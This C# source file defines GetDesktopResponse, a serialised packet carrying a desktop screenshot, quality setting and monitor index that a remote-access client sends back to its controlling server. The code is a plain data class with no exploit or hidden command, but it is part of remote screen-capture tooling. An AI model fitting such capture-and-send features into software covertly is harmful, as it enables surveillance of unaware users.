﻿using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class GetDesktopResponse : IPacket
    {
        [ProtoMember(1)]
        public byte[] Image { get; set; }

        [ProtoMember(2)]
        public int Quality { get; set; }

        [ProtoMember(3)]
        public int Monitor { get; set; }

        public GetDesktopResponse()
        {
        }

        public GetDesktopResponse(byte[] image, int quality, int monitor)
        {
            this.Image = image;
            this.Quality = quality;
            this.Monitor = monitor;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}